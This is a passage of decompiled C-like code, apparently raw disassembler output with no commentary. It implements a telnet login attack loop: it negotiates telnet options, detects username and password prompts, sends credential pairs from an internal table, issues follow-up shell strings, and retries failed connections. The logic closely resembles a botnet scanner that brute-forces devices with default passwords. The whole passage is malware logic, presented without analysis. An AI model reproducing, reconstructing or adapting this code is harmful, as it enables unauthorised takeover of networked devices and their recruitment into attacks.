                *(undefined4 *)(puVar22 + -4) = 0x8050a28;
                FUN_0804fc90();
              }
            }
            else {
              if (pbVar14 == (byte *)0x1) goto LAB_08051661;
              piVar10 = *(int **)(iVar7 + 4);
              *(uint *)(puVar22 + ((uint)piVar10 >> 5) * 4 + 0x6a4) =
                   *(uint *)(puVar22 + ((uint)piVar10 >> 5) * 4 + 0x6a4) |
                   1 << ((byte)piVar10 & 0x1f);
              if ((int)unaff_EBP < (int)piVar10) {
                unaff_EBP = piVar10;
              }
            }
          }
LAB_080509a6:
          iVar7 = *(int *)(puVar22 + 0x750) + 1;
          *(int *)(puVar22 + 0x750) = iVar7;
          ppiVar23 = (int **)puVar22;
          if (0x7f < iVar7) {
LAB_08050a48:
            *(undefined4 *)((int)ppiVar23 + 0x744) = 0;
            *(undefined4 *)((int)ppiVar23 + 0x740) = 1;
            *(undefined **)((int)ppiVar23 + -0x10) = (undefined *)((int)ppiVar23 + 0x740);
            *(undefined4 *)((int)ppiVar23 + -0x14) = 0;
            *(undefined **)((int)ppiVar23 + -0x18) = (undefined *)((int)ppiVar23 + 0x624);
            *(undefined **)((int)ppiVar23 + -0x1c) = (undefined *)((int)ppiVar23 + 0x6a4);
            if ((int)unaff_EBP < (int)unaff_EDI) {
              unaff_EBP = unaff_EDI;
            }
            *(uint *)((int)ppiVar23 + -0x20) = (int)unaff_EBP + 1;
            *(undefined4 *)((int)ppiVar23 + -0x24) = 0x8050a8a;
            FUN_08054550();
            *(undefined4 *)((int)ppiVar23 + -0x10) = 0;
            *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050a94;
            DAT_08057150 = (int *)FUN_08054c4c();
            *(undefined4 *)((int)ppiVar23 + 0x750) = 0;
            iVar7 = 0;
            do {
              unaff_EDI = (int *)(iVar7 * 0x120 + DAT_080576f0);
              uVar8 = unaff_EDI[1];
              if (uVar8 != 0xffffffff) {
                uVar18 = uVar8 >> 5;
                bVar17 = (byte)uVar8 & 0x1f;
                if ((*(uint *)((int)ppiVar23 + uVar18 * 4 + 0x624) >> bVar17 & 1) != 0) {
                  *(undefined4 *)((int)ppiVar23 + 0x74c) = 0;
                  *(undefined4 *)((int)ppiVar23 + 0x748) = 4;
                  *(undefined **)((int)ppiVar23 + -0x10) = (undefined *)((int)ppiVar23 + 0x748);
                  *(undefined **)((int)ppiVar23 + -0x14) = (undefined *)((int)ppiVar23 + 0x74c);
                  *(undefined4 *)((int)ppiVar23 + -0x18) = 4;
                  *(undefined4 *)((int)ppiVar23 + -0x1c) = 1;
                  *(int *)((int)ppiVar23 + -0x20) = unaff_EDI[1];
                  *(undefined4 *)((int)ppiVar23 + -0x24) = 0x80514b6;
                  uVar8 = FUN_08054034();
                  if ((uVar8 | *(uint *)((int)ppiVar23 + 0x74c)) != 0) {
                    *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051533;
                    FUN_08054c95();
                    unaff_EDI[1] = -1;
                    *(undefined *)(unaff_EDI + 0x47) = 0;
                    unaff_EDI[3] = 0;
                    goto LAB_08051086;
                  }
                  unaff_EDI[3] = 2;
                  *(undefined4 *)((int)ppiVar23 + -4) = 0x80514ce;
                  uVar8 = FUN_0804f4a0();
                  if (0 < DAT_08057118) {
                    iVar11 = 0;
                    iVar7 = DAT_08057148;
                    do {
                      uVar4 = (ushort)((ulonglong)uVar8 % (ulonglong)DAT_0805714c);
                      if ((*(ushort *)(iVar7 + 8) <= uVar4) && (uVar4 < *(ushort *)(iVar7 + 10)))
                      goto LAB_0805150c;
                      iVar11 = iVar11 + 1;
                      iVar7 = iVar7 + 0x10;
                    } while (iVar11 != DAT_08057118);
                  }
                  iVar7 = 0;
LAB_0805150c:
                  *unaff_EDI = iVar7;
                  uVar18 = (uint)unaff_EDI[1] >> 5;
                  bVar17 = (byte)unaff_EDI[1] & 0x1f;
                  unaff_EDI[6] = 0;
                }
                if ((*(uint *)((int)ppiVar23 + uVar18 * 4 + 0x6a4) >> bVar17 & 1) != 0) {
                  *(int **)((int)ppiVar23 + 0x14) = unaff_EDI + 7;
                  *(int **)((int)ppiVar23 + 0x10) = unaff_EDI + 0x17;
switchD_08050b7e_caseD_0:
                  iVar7 = unaff_EDI[3];
joined_r0x08050b02:
                  if (iVar7 == 0) goto LAB_08051086;
                  *(undefined4 *)((int)ppiVar23 + 0x18) = *(undefined4 *)((int)ppiVar23 + 0x14);
                  if (unaff_EDI[6] == 0x100) {
                    *(int *)((int)ppiVar23 + -4) = iVar7;
                    *(undefined4 *)((int)ppiVar23 + -8) = 0xc0;
                    *(undefined4 *)((int)ppiVar23 + -0xc) = *(undefined4 *)((int)ppiVar23 + 0x10);
                    *(undefined4 *)((int)ppiVar23 + 0x18) = *(undefined4 *)((int)ppiVar23 + 0x14);
                    *(undefined4 *)((int)ppiVar23 + -0x10) = *(undefined4 *)((int)ppiVar23 + 0x14);
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051409;
                    FUN_080548f8();
                    unaff_EDI[6] = unaff_EDI[6] + -0x40;
                  }
                  *(undefined4 *)((int)ppiVar23 + -4) = 0x8050b22;
                  puVar9 = (undefined4 *)FUN_080528b0();
                  iVar7 = *(int *)((int)ppiVar23 + 0x18);
                  *puVar9 = 0;
                  iVar11 = unaff_EDI[6];
                  *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
                  iVar7 = iVar7 + iVar11;
                  *(int *)((int)ppiVar23 + -8) = 0x100 - iVar11;
                  *(int *)((int)ppiVar23 + -0xc) = iVar7;
                  *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
                  *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050b48;
                  iVar11 = FUN_08054260();
                  if (iVar11 < 1) {
                    if (iVar11 == 0) {
                      *(undefined4 *)((int)ppiVar23 + -4) = 0x8051694;
                      puVar9 = (undefined4 *)FUN_080528b0();
                      *puVar9 = 0x68;
                    }
                    else if (iVar11 != -1) goto LAB_08050b65;
                    *(undefined4 *)((int)ppiVar23 + -4) = 0x8051399;
                    piVar10 = (int *)FUN_080528b0();
                    if (*piVar10 != 0xb) {
                      *(undefined4 *)((int)ppiVar23 + -4) = 0x80513a7;
                      piVar10 = (int *)FUN_080528b0();
                      if (*piVar10 != 0xb) {
                        *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
                        *(undefined4 *)((int)ppiVar23 + -0x14) = 0x80513bc;
                        FUN_08054c95();
                        cVar3 = *(char *)(unaff_EDI + 0x47);
                        unaff_EDI[1] = -1;
                        *(byte *)(unaff_EDI + 0x47) = cVar3 + 1U;
                        if ((byte)(cVar3 + 1U) < 10) {
                          *(undefined4 *)((int)ppiVar23 + -4) = 0x80516a6;
                          FUN_0804fc90();
                        }
                        else {
                          *(undefined *)(unaff_EDI + 0x47) = 0;
                          unaff_EDI[3] = 0;
                        }
                      }
                    }
                    goto LAB_08051086;
                  }
                  iVar19 = 0;
                  do {
                    if (*(char *)(iVar19 + iVar7) == '\0') {
                      *(undefined *)(iVar19 + iVar7) = 0x41;
                    }
                    iVar19 = iVar19 + 1;
                  } while (iVar19 != iVar11);
LAB_08050b65:
                  piVar10 = DAT_08057150;
                  unaff_EDI[6] = unaff_EDI[6] + iVar11;
                  unaff_EDI[2] = (int)piVar10;
LAB_08050b75:
                  switch(unaff_EDI[3]) {
                  default:
                    goto switchD_08050b7e_caseD_0;
                  case 2:
                    iVar7 = unaff_EDI[6];
                    pcVar21 = *(char **)((int)ppiVar23 + 0x18);
                    unaff_EBP = (int *)0x0;
LAB_08051141:
                    if ((int)unaff_EBP < iVar7) {
                      do {
                        if (*pcVar21 != -1) break;
                        pcVar1 = pcVar21 + 1;
                        if ((char *)(*(int *)((int)ppiVar23 + 0x18) + iVar7) <= pcVar1) break;
                        if (pcVar21[1] == -1) {
                          pcVar21 = pcVar21 + 2;
                          unaff_EBP = (int *)((int)unaff_EBP + 2);
                          goto LAB_08051141;
                        }
                        if (pcVar21[1] == -3) {
                          *(undefined *)((int)ppiVar23 + 0x757) = 0xff;
                          *(undefined *)((int)ppiVar23 + 0x758) = 0xfb;
                          *(undefined *)((int)ppiVar23 + 0x759) = 0x1f;
                          *(undefined *)((int)ppiVar23 + 0x737) = 0xff;
                          *(undefined *)((int)ppiVar23 + 0x738) = 0xfa;
                          *(undefined *)((int)ppiVar23 + 0x739) = 0x1f;
                          *(undefined *)((int)ppiVar23 + 0x73a) = 0;
                          *(undefined *)((int)ppiVar23 + 0x73b) = 0x50;
                          *(undefined *)((int)ppiVar23 + 0x73c) = 0;
                          *(undefined *)((int)ppiVar23 + 0x73d) = 0x18;
                          *(undefined *)((int)ppiVar23 + 0x73e) = 0xff;
                          *(undefined *)((int)ppiVar23 + 0x73f) = 0xf0;
                          if ((char *)(*(int *)((int)ppiVar23 + 0x18) + unaff_EDI[6]) <= pcVar21 + 2
                             ) break;
                          if (pcVar21[2] == '\x1f') goto code_r0x0805125e;
                        }
                        else if ((char *)(*(int *)((int)ppiVar23 + 0x18) + iVar7) <= pcVar21 + 2)
                        break;
                        if (*pcVar21 == -3) {
                          *pcVar21 = -4;
                          cVar3 = *pcVar1;
                          if (cVar3 == -3) goto LAB_080512ac;
LAB_08051185:
                          if (cVar3 == -5) {
                            *pcVar1 = -3;
                          }
                          cVar3 = pcVar21[2];
                          if (cVar3 != -3) goto LAB_08051198;
LAB_080512ba:
                          pcVar21[2] = -4;
                        }
                        else {
                          if (*pcVar21 == -5) {
                            *pcVar21 = -3;
                          }
                          cVar3 = *pcVar1;
                          if (cVar3 != -3) goto LAB_08051185;
LAB_080512ac:
                          *pcVar1 = -4;
                          cVar3 = pcVar21[2];
                          if (cVar3 == -3) goto LAB_080512ba;
LAB_08051198:
                          if (cVar3 == -5) {
                            pcVar21[2] = -3;
                          }
                        }
                        *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
                        *(undefined4 *)((int)ppiVar23 + -8) = 3;
                        *(char **)((int)ppiVar23 + -0xc) = pcVar21;
                        unaff_EBP = (int *)((int)unaff_EBP + 3);
                        pcVar21 = pcVar21 + 3;
                        *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
                        *(undefined4 *)((int)ppiVar23 + -0x14) = 0x80511b7;
                        FUN_080542d8();
                        iVar7 = unaff_EDI[6];
                        if (iVar7 <= (int)unaff_EBP) break;
                      } while( true );
                    }
                    if (0 < (int)unaff_EBP) {
                      unaff_EDI[3] = 3;
                    }
                    goto LAB_08051073;
                  case 3:
                    iVar11 = unaff_EDI[6];
                    iVar7 = iVar11 + -1;
                    if (iVar7 < 1) {
LAB_08051426:
                      *(undefined4 *)((int)ppiVar23 + -4) = 4;
                      *(undefined **)((int)ppiVar23 + -8) = &DAT_0805646b;
                      *(int *)((int)ppiVar23 + -0xc) = iVar11;
                      *(undefined4 *)((int)ppiVar23 + -0x10) = *(undefined4 *)((int)ppiVar23 + 0x18)
                      ;
                      *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051438;
                      unaff_EBP = (int *)FUN_08052240();
                      if (unaff_EBP == (int *)0xffffffff) {
                        *(undefined4 *)((int)ppiVar23 + -4) = 5;
                        *(char **)((int)ppiVar23 + -8) = "enter";
                        *(int *)((int)ppiVar23 + -0xc) = unaff_EDI[6];
                        *(undefined4 *)((int)ppiVar23 + -0x10) =
                             *(undefined4 *)((int)ppiVar23 + 0x18);
                        *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051565;
                        unaff_EBP = (int *)FUN_08052240();
                        if (unaff_EBP == (int *)0xffffffff) goto switchD_08050b7e_caseD_0;
                      }
                      if ((int)unaff_EBP < 1) goto LAB_08051073;
                    }
                    else {
                      cVar3 = *(char *)((int)unaff_EDI + iVar11 + 0x1b);
                      if ((((cVar3 != ':') && (cVar3 != '>')) && (cVar3 != '$')) && (cVar3 != '#'))
                      {
                        iVar19 = (int)unaff_EDI + iVar11 + 0x1c;
                        while (cVar3 != '%') {
                          iVar7 = iVar7 + -1;
                          if (iVar7 == 0) goto LAB_08051426;
                          cVar3 = *(char *)(iVar19 + -2);
                          if (((cVar3 == ':') || (cVar3 == '>')) ||
                             ((cVar3 == '$' || (cVar3 == '#')))) break;
                          iVar19 = iVar19 + -1;
                        }
                      }
                      unaff_EBP = (int *)(iVar7 + 1);
                    }
                    puVar9 = (undefined4 *)*unaff_EDI;
                    *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
                    *(uint *)((int)ppiVar23 + -8) = (uint)*(byte *)(puVar9 + 3);
                    *(undefined4 *)((int)ppiVar23 + -0xc) = *puVar9;
                    *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051114;
                    FUN_080542d8();
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x4000;
                    *(undefined4 *)((int)ppiVar23 + -0x18) = 2;
                    *(undefined **)((int)ppiVar23 + -0x1c) = &DAT_08056266;
                    *(int *)((int)ppiVar23 + -0x20) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x24) = 0x8051129;
                    FUN_080542d8();
                    unaff_EDI[3] = 4;
                    goto LAB_08051073;
                  case 4:
                    iVar11 = unaff_EDI[6];
                    iVar7 = iVar11 + -1;
                    if (iVar7 < 1) {
LAB_08051453:
                      *(undefined4 *)((int)ppiVar23 + -4) = 7;
                      *(char **)((int)ppiVar23 + -8) = "assword";
                      *(int *)((int)ppiVar23 + -0xc) = iVar11;
                      *(undefined4 *)((int)ppiVar23 + -0x10) = *(undefined4 *)((int)ppiVar23 + 0x18)
                      ;
                      *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051465;
                      unaff_EBP = (int *)FUN_08052240();
                      if (unaff_EBP == (int *)0xffffffff) goto switchD_08050b7e_caseD_0;
                      if ((int)unaff_EBP < 1) goto LAB_08051073;
                    }
                    else {
                      cVar3 = *(char *)((int)unaff_EDI + iVar11 + 0x1b);
                      if (((cVar3 != ':') && (cVar3 != '>')) && (cVar3 != '$')) {
                        iVar19 = (int)unaff_EDI + iVar11 + 0x1c;
                        while (cVar3 != '#') {
                          iVar7 = iVar7 + -1;
                          if (iVar7 == 0) goto LAB_08051453;
                          cVar3 = *(char *)(iVar19 + -2);
                          if (((cVar3 == ':') || (cVar3 == '>')) || (cVar3 == '$')) break;
                          iVar19 = iVar19 + -1;
                        }
                      }
                      unaff_EBP = (int *)(iVar7 + 1);
                    }
                    iVar7 = *unaff_EDI;
                    *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
                    *(uint *)((int)ppiVar23 + -8) = (uint)*(byte *)(iVar7 + 0xd);
                    *(undefined4 *)((int)ppiVar23 + -0xc) = *(undefined4 *)(iVar7 + 4);
                    *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051054;
                    FUN_080542d8();
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x4000;
                    *(undefined4 *)((int)ppiVar23 + -0x18) = 2;
                    *(undefined **)((int)ppiVar23 + -0x1c) = &DAT_08056266;
                    *(int *)((int)ppiVar23 + -0x20) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x24) = 0x8051069;
                    FUN_080542d8();
                    unaff_EDI[3] = 5;
                    goto LAB_08051073;
                  case 5:
                    iVar11 = unaff_EDI[6];
                    iVar7 = iVar11 + -1;
                    if (iVar7 < 1) goto switchD_08050b7e_caseD_0;
                    cVar3 = *(char *)((int)unaff_EDI + iVar11 + 0x1b);
                    if (((cVar3 != ':') && (cVar3 != '>')) && ((cVar3 != '$' && (cVar3 != '#')))) {
                      iVar11 = (int)unaff_EDI + iVar11 + 0x1c;
                      while (cVar3 != '%') {
                        iVar7 = iVar7 + -1;
                        if (iVar7 == 0) goto switchD_08050b7e_caseD_0;
                        cVar3 = *(char *)(iVar11 + -2);
                        if ((((cVar3 == ':') || (cVar3 == '>')) || (cVar3 == '$')) || (cVar3 == '#')
                           ) break;
                        iVar11 = iVar11 + -1;
                      }
                    }
                    unaff_EBP = (int *)(iVar7 + 1);
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x15;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050f91;
                    FUN_08051840();
                    *(undefined **)((int)ppiVar23 + -0xc) = (undefined *)((int)ppiVar23 + 0x748);
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x15;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050fa2;
                    uVar13 = FUN_08051790();
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x4000;
                    *(undefined4 *)((int)ppiVar23 + -0x18) = *(undefined4 *)((int)ppiVar23 + 0x748);
                    *(undefined4 *)((int)ppiVar23 + -0x1c) = uVar13;
                    *(int *)((int)ppiVar23 + -0x20) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x24) = 0x8050fb9;
                    FUN_080542d8();
                    *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
                    *(undefined4 *)((int)ppiVar23 + -8) = 2;
                    *(undefined **)((int)ppiVar23 + -0xc) = &DAT_08056266;
                    *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050fd1;
                    FUN_080542d8();
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x15;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050fdd;
                    FUN_080517c0();
                    unaff_EDI[3] = 6;
                    break;
                  case 6:
                    iVar11 = unaff_EDI[6];
                    iVar7 = iVar11 + -1;
                    if (iVar7 < 1) goto switchD_08050b7e_caseD_0;
                    cVar3 = *(char *)((int)unaff_EDI + iVar11 + 0x1b);
                    if ((((cVar3 != ':') && (cVar3 != '>')) && (cVar3 != '$')) && (cVar3 != '#')) {
                      iVar11 = (int)unaff_EDI + iVar11 + 0x1c;
                      while (cVar3 != '%') {
                        iVar7 = iVar7 + -1;
                        if (iVar7 == 0) goto switchD_08050b7e_caseD_0;
                        cVar3 = *(char *)(iVar11 + -2);
                        if (((cVar3 == ':') || (cVar3 == '>')) || ((cVar3 == '$' || (cVar3 == '#')))
                           ) break;
                        iVar11 = iVar11 + -1;
                      }
                    }
                    unaff_EBP = (int *)(iVar7 + 1);
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x16;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050ed1;
                    FUN_08051840();
                    *(undefined **)((int)ppiVar23 + -0xc) = (undefined *)((int)ppiVar23 + 0x748);
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x16;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050ee2;
                    uVar13 = FUN_08051790();
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x4000;
                    *(undefined4 *)((int)ppiVar23 + -0x18) = *(undefined4 *)((int)ppiVar23 + 0x748);
                    *(undefined4 *)((int)ppiVar23 + -0x1c) = uVar13;
                    *(int *)((int)ppiVar23 + -0x20) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x24) = 0x8050ef9;
                    FUN_080542d8();
                    *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
                    *(undefined4 *)((int)ppiVar23 + -8) = 2;
                    *(undefined **)((int)ppiVar23 + -0xc) = &DAT_08056266;
                    *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050f11;
                    FUN_080542d8();
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x16;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050f1d;
                    FUN_080517c0();
                    unaff_EDI[3] = 7;
                    break;
                  case 7:
                    iVar11 = unaff_EDI[6];
                    iVar7 = iVar11 + -1;
                    if (iVar7 < 1) goto switchD_08050b7e_caseD_0;
                    cVar3 = *(char *)((int)unaff_EDI + iVar11 + 0x1b);
                    if (((cVar3 != ':') && (cVar3 != '>')) && ((cVar3 != '$' && (cVar3 != '#')))) {
                      iVar11 = (int)unaff_EDI + iVar11 + 0x1c;
                      while (cVar3 != '%') {
                        iVar7 = iVar7 + -1;
                        if (iVar7 == 0) goto switchD_08050b7e_caseD_0;
                        cVar3 = *(char *)(iVar11 + -2);
                        if (((cVar3 == ':') || (cVar3 == '>')) || ((cVar3 == '$' || (cVar3 == '#')))
                           ) break;
                        iVar11 = iVar11 + -1;
                      }
                    }
                    unaff_EBP = (int *)(iVar7 + 1);
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x14;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050e11;
                    FUN_08051840();
                    *(undefined **)((int)ppiVar23 + -0xc) = (undefined *)((int)ppiVar23 + 0x748);
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x14;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050e22;
                    uVar13 = FUN_08051790();
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x4000;
                    *(undefined4 *)((int)ppiVar23 + -0x18) = *(undefined4 *)((int)ppiVar23 + 0x748);
                    *(undefined4 *)((int)ppiVar23 + -0x1c) = uVar13;
                    *(int *)((int)ppiVar23 + -0x20) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x24) = 0x8050e39;
                    FUN_080542d8();
                    *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
                    *(undefined4 *)((int)ppiVar23 + -8) = 2;
                    *(undefined **)((int)ppiVar23 + -0xc) = &DAT_08056266;
                    *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050e51;
                    FUN_080542d8();
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x14;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050e5d;
                    FUN_080517c0();
                    unaff_EDI[3] = 8;
                    break;
                  case 8:
                    iVar11 = unaff_EDI[6];
                    iVar7 = iVar11 + -1;
                    if (iVar7 < 1) goto switchD_08050b7e_caseD_0;
                    cVar3 = *(char *)((int)unaff_EDI + iVar11 + 0x1b);
                    if (((cVar3 != ':') && (cVar3 != '>')) && ((cVar3 != '$' && (cVar3 != '#')))) {
                      iVar11 = (int)unaff_EDI + iVar11 + 0x1c;
                      while (cVar3 != '%') {
                        iVar7 = iVar7 + -1;
                        if (iVar7 == 0) goto switchD_08050b7e_caseD_0;
                        cVar3 = *(char *)(iVar11 + -2);
                        if ((((cVar3 == ':') || (cVar3 == '>')) || (cVar3 == '$')) || (cVar3 == '#')
                           ) break;
                        iVar11 = iVar11 + -1;
                      }
                    }
                    unaff_EBP = (int *)(iVar7 + 1);
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x17;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050d51;
                    FUN_08051840();
                    *(undefined **)((int)ppiVar23 + -0xc) = (undefined *)((int)ppiVar23 + 0x748);
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x17;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050d62;
                    uVar13 = FUN_08051790();
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x4000;
                    *(undefined4 *)((int)ppiVar23 + -0x18) = *(undefined4 *)((int)ppiVar23 + 0x748);
                    *(undefined4 *)((int)ppiVar23 + -0x1c) = uVar13;
                    *(int *)((int)ppiVar23 + -0x20) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x24) = 0x8050d79;
                    FUN_080542d8();
                    *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
                    *(undefined4 *)((int)ppiVar23 + -8) = 2;
                    *(undefined **)((int)ppiVar23 + -0xc) = &DAT_08056266;
                    *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050d91;
                    FUN_080542d8();
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x17;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050d9d;
                    FUN_080517c0();
                    unaff_EDI[3] = 9;
                    break;
                  case 9:
                    iVar11 = unaff_EDI[6];
                    iVar7 = iVar11 + -1;
                    if (iVar7 < 1) goto switchD_08050b7e_caseD_0;
                    cVar3 = *(char *)((int)unaff_EDI + iVar11 + 0x1b);
                    if ((((cVar3 != ':') && (cVar3 != '>')) && (cVar3 != '$')) && (cVar3 != '#')) {
                      iVar11 = (int)unaff_EDI + iVar11 + 0x1c;
                      while (cVar3 != '%') {
                        iVar7 = iVar7 + -1;
                        if (iVar7 == 0) goto switchD_08050b7e_caseD_0;
                        cVar3 = *(char *)(iVar11 + -2);
                        if (((cVar3 == ':') || (cVar3 == '>')) || ((cVar3 == '$' || (cVar3 == '#')))
                           ) break;
                        iVar11 = iVar11 + -1;
                      }
                    }
                    unaff_EBP = (int *)(iVar7 + 1);
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x18;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050c93;
                    FUN_08051840();
                    *(undefined **)((int)ppiVar23 + -0xc) = (undefined *)((int)ppiVar23 + 0x748);
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x18;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050ca4;
                    uVar13 = FUN_08051790();
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x4000;
                    *(undefined4 *)((int)ppiVar23 + -0x18) = *(undefined4 *)((int)ppiVar23 + 0x748);
                    *(undefined4 *)((int)ppiVar23 + -0x1c) = uVar13;
                    *(int *)((int)ppiVar23 + -0x20) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x24) = 0x8050cbb;
                    FUN_080542d8();
                    *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
                    *(undefined4 *)((int)ppiVar23 + -8) = 2;
                    *(undefined **)((int)ppiVar23 + -0xc) = &DAT_08056266;
                    *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050cd3;
                    FUN_080542d8();
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x18;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050cdf;
                    FUN_080517c0();
                    unaff_EDI[3] = 10;
                    break;
                  case 10:
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x1a;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050b8f;
                    FUN_08051840();
                    *(undefined **)((int)ppiVar23 + -0xc) = (undefined *)((int)ppiVar23 + 0x748);
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x1a;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050ba0;
                    uVar13 = FUN_08051790();
                    *(int *)((int)ppiVar23 + -0x14) = *(int *)((int)ppiVar23 + 0x748) + -1;
                    *(undefined4 *)((int)ppiVar23 + -0x18) = uVar13;
                    *(int *)((int)ppiVar23 + -0x1c) = unaff_EDI[6];
                    *(undefined4 *)((int)ppiVar23 + -0x20) = *(undefined4 *)((int)ppiVar23 + 0x18);
                    *(undefined4 *)((int)ppiVar23 + -0x24) = 0x8050bb8;
                    iVar7 = FUN_08052240();
                    if (iVar7 != -1) {
                      *(undefined4 *)((int)ppiVar23 + -0x10) = 0x1a;
                      *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050bcc;
                      FUN_080517c0();
                      *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
                      *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050bd6;
                      FUN_08054c95();
                      cVar3 = *(char *)(unaff_EDI + 0x47);
                      unaff_EDI[1] = -1;
                      *(char *)(unaff_EDI + 0x47) = cVar3 + '\x01';
                      if ((char)(cVar3 + '\x01') == '\n') {
                        *(undefined *)(unaff_EDI + 0x47) = 0;
                        unaff_EDI[3] = 0;
                      }
                      else {
                        *(undefined4 *)((int)ppiVar23 + -4) = 0x8051421;
                        FUN_0804fc90();
                      }
                      unaff_EBP = (int *)0xffffffff;
                      break;
                    }
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x1a;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x80512e6;
                    FUN_080517c0();
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x19;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x80512f2;
                    FUN_08051840();
                    *(undefined **)((int)ppiVar23 + -0xc) = (undefined *)((int)ppiVar23 + 0x748);
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x19;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051303;
                    uVar13 = FUN_08051790();
                    *(int *)((int)ppiVar23 + -0x14) = *(int *)((int)ppiVar23 + 0x748) + -1;
                    *(undefined4 *)((int)ppiVar23 + -0x18) = uVar13;
                    *(int *)((int)ppiVar23 + -0x1c) = unaff_EDI[6];
                    *(undefined4 *)((int)ppiVar23 + -0x20) = *(undefined4 *)((int)ppiVar23 + 0x18);
                    *(undefined4 *)((int)ppiVar23 + -0x24) = 0x805131b;
                    unaff_EBP = (int *)FUN_08052240();
                    *(undefined4 *)((int)ppiVar23 + -0x10) = 0x19;
                    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051327;
                    FUN_080517c0();
                    if (unaff_EBP == (int *)0xffffffff) goto switchD_08050b7e_caseD_0;
                    if (0 < (int)unaff_EBP) {
                      iVar7 = unaff_EDI[4];
                      *(int *)((int)ppiVar23 + 0x24) = *unaff_EDI;
                      iVar11 = unaff_EDI[5];
                      *(int *)((int)ppiVar23 + 0x748) = iVar7;
